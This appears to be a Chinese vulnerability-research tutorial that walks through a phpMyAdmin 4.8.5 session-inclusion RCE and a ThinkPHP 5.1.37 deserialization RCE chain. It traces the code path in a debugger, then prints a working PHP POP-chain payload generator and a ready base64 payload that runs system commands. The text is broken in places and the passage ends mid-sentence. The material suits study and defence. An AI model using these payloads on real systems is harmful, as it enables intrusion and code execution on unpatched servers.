删除 cookie 
访问主页登录进去 
登录进来之后访问两次 
http://localhost/phpmyadmin4.8.5/index.php?db=test 
成功 RCE 
下面就是代审环节： 
入口点 
index.php 中用了 Config 文件 
Config.php 文件中使用了 require 包含了 common.inc.php 文件 
在 lib/common.inc.php 中我们可以看到又包含了另一个目录的
common.inc.php 
跟进去我们可以看到 453 行代码 
这里有一个 loadUserPreferences 函数，是用来加载用户数据库里面
的内容，全局搜索找到该函数位置 
第 972 行使用了 load 函数 
跟进来 
前面的入口流程就这么多，接下来就是核心分析，打上断点动态
debug 调试 
我们可以看到第一行有 getRelationsParam，f7 跟进去，我们可以看
到该函数是读取 sessions 的一些数据，如下 
然后 return 回来 
然后跟下来是 backquote 函数，f7 进去 
进行拼接 test 和 pma__userconfig 
然后就往下走到 88-92 进行拼接 sql 语句 
然后就是 93 行的 fetchSingleRow 函数，继续跟进来 
这里的 config_data 获取到了路径 
Return 回来 
然后会对 config_data 表进行 json_decode 处理 
这里会进入一个 readConfig 函数 
然后跳过一些意义不大的函数 
到这里会给 prefs 一个赋值 
然后就是给 config_data 赋值 
路径就传过来了 
953 行会 global 一个 cfg，并传过来 config_data 
这里就是我们的漏洞点了，如下 
我们跟进 Util 中的 getScriptNameForOption 函数，如下 
Location 是 database 不是 server，于是跳过该条件判断，并且注意此
时带过来的 target 是我们的 sessions 路径 
此时可以看到 switch 中没有能跟路径匹配的 
于是原路返回我们的 target 
进行包含 
成功 RCE  
反序列化 RCE 
接着我们来分析难度较高的反序列化+RCE，因为目前反序列化的文
章并不是很多，所以这里先说一下基础概念 
先来看一下这段代码，基本的注释我已经在上面写好了，大家过一下
就行，现在说一下几个点 
1 输出的变量 zactest 为什么变成了 zaczactest？ 
这是因为定义$zactest 的时候用的是 private 方法，我们看下面这段
话 
private 是私有权限，他只能用在 zac 类中，但是在序列化后呢，为了
表明这个是我独有的，他就必须要在定义的变量之前加上自己的类名 
2 zaczactest 明明是 10 个字符，为什么显示 12 个？ 
    这是因为私有化属性序列化的格式是%00 类名%00 属性名，类名就
是 zac，属性名就是 zactest，在这当中分别插入两个%00，所以就多
出了两个字符，但为啥没显示出来呢？这是因为%00 是空白符 
    3 为什么 zac 变量前要加上一个*，并且字符数是 6 
这个同理 2，因为是 protected 方法赋值的$zac，所以它也有相应的
格式，protected 格式为%00*%00 属性名，这也是为什么 zac 变量前面
要加上一个*，并且字符数是 6 的原因了 
 4 那除了这两个方法，public 有什么特性呢？ 
    前面俩兄弟都有相应的序列化格式，但是 public 没有，该是多少就
是多少，他的特性就是 public 是公有化的，所以 public 赋值的变量可
以在任何地方被访问 
然后就是实例复现，安装 thinkphp5.1.37，然后将 framework 改名为
thinkphp 放到,tp5.1.37 的目录里 
https://github.com/top-think/framework/releases/tag/v5.1.37 
https://github.com/top-think/think/releases/tag/v5.1.37 
因为我对反序列化也不是特别熟悉，所以以下基本完全参照该文章 
https://www.cnblogs.com/xueweihan/p/11931096.html  
不过稍微修改了一些，比如过程中的一些方法，还有最后的动态审计
部分，并且这篇文章中的 poc 我也是没复现成功，最后找到其他大佬
发出来的 poc 复现成功的 
（如侵权私聊我） 
全局搜索_destruct 
可以看到 desturct 有一个 removeFiles，跟进 
我们可以看到其中有一个 file_exists，那么当 filename 是一个对象的
时候，就会调用 toString 
全局搜索 toString 
发现 toString 里面只有个 toJson，继续跟进 
发现有个 toArray，跟进去 
往下翻，看到这几行代码，$this->append 的键名是 key，name 可控 
那么 188 行的 realtion 呢？跟进 getRelation 试试 
我们可以看到在 toArray 函数中的第 201 行，判断!relation，那么想
进来这个 if 里，就要让$this->relation 返回空之类的，让 key 不在
$this->relation 
跟下去 getAttr 
跟进 getData 
我们只需要让$this->data 中 有 $key 这个键，然后让 getAttr() 函
数 486 行 下 面的 if 判 断 都 没 有 ， 就 可 以 直 接 使  $relation = 
$this->data[$key] ; 
那么$this->data 可控，$key 也是可控的($this->append 中的 键名)，
所以 $relation 也是可控的 
我们接着全局搜索__call 
看到了 call_user_func_array，发现我们可以完全控制住第一个参数 
那么我们现在就需要找到这类函数，比如 input 
但这里我们只能去找间接调用 input 的方法，全局搜索$this->input，
找到 param 函数 
我们在当前目录搜索哪里调用了 param 这个函数，看到了 isAjax 
然后开始进行漏洞复现，首先在 
\application\index\controller\Index.php 
文件添加一个反序列化入口 
然后我们构建一个 payload 
append = ["ethan"=>["dir","calc"]]; 
$this->data = ["ethan"=>new Request()]; 
} 
} 
class Request 
{ 
protected $hook = []; 
protected $filter = "system"; 
protected $config = [ 
// 表单请求类型伪装变量 
'var_method'       => '_method', 
// 表单 ajax 伪装变量 
'var_ajax'         => '_ajax', 
// 表单 pjax 伪装变量 
'var_pjax'         => '_pjax', 
// PATHINFO 变量名 用于兼容模式 
'var_pathinfo'     => 's', 
// 兼容 PATH_INFO 获取 
'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 
'REDIRECT_URL'], 
// 默认全局过滤方法 用逗号分隔多个 
'default_filter'   => '', 
// 域名根，如 thinkphp.cn 
'url_domain_root'  => '', 
// HTTPS 代理标识 
'https_agent_name' => '', 
// IP 代理获取标识 
'http_agent_ip'    => 'HTTP_X_REAL_IP', 
// URL 伪静态后缀 
'url_html_suffix'  => 'html', 
]; 
function __construct(){ 
$this->filter = "system"; 
$this->config = ["var_ajax"=>'']; 
$this->hook = ["visible"=>[$this,"isAjax"]]; 
} 
} 
namespace think\process\pipes; 
use think\model\concern\Conversion; 
use think\model\Pivot; 
class Windows 
{ 
private $files = []; 
public function __construct() 
{ 
$this->files=[new Pivot()]; 
} 
} 
namespace think\model; 
use think\Model; 
class Pivot extends Model 
{ 
} 
use think\process\pipes\Windows; 
echo base64_encode(serialize(new Windows())); 
/*input=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOn
tzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIj
thOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIA
KgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJka
XIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAG
RhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVz
dCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyO
ntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI
7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoid
mFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami*/ 
?> 
然后 php 2.php    生成 payload，在 id 里加个 whoami 
成功拿下 rce 
因为这个反序列化网上教程都是静态硬审的，所以非常不好理解，为
了便于理解，我们可以使用 xdebug 配合 phpstorm 进行动态调试，
更好地理解参数传递的过程 
Php.ini 文件： 
然后开启监听，burp 打上 payload 开始跟 
入口进来 
然后 param 函数，获取到了一些方法之类的参数 
跟到 input 
getFilter 
反序列化入口点 
调用__destruct 
removeFiles 
调用了 toString 
然后跟进 tojson 
继续跟进 toArray 
然后就是 getAttr 
getData 
getRelation 
然后跳过几个无用步骤，进到了 call 
isAjax 
然后再跳到 param 
然后再跳几下，就到了 appShutdown 结束 
这就是一个大致的流程，理论还是按照静态审的来，也可以动态自己
跟着走一遍可以理解（这里用的都是 f8，如果要跟的更加深入一点可
以 f7 进入每个方法的模块一点点看，我这里跳步比较多，所以还是
推荐自己去跟一下深入理解） 
Php 说了这么多，那么再来稍微说下 java，因为我 java 学的并不是很
多，所以这里只是简单写几个案例，先来说一下 java 和 php 不同的
地方，php 中的 exec，就相当于正常的 cmd 了，但是在 java 中却不
一样，如下，单纯一个 whoami 可以正常执行 
但 是 当 我 们 用 管 道 符 拼 接 的 时 候 发 现 ， 报 错 了 ， 这 是 因 为
Runtime.getRuntime().exec 将里面的参数当成一个完整的字符串了，
而不是管道符分割的两个命令，那么也就不能像 php 一样进行拼接
rce 了，这也是体现 java 安全性高的一点（当然如果开发直接把参数
代入了也是可以的，但是我没找到这样的 java 案例，这里有个坑点，
记得加 exec.waitFor，不然执行不成功的，也可能单纯是我环境的问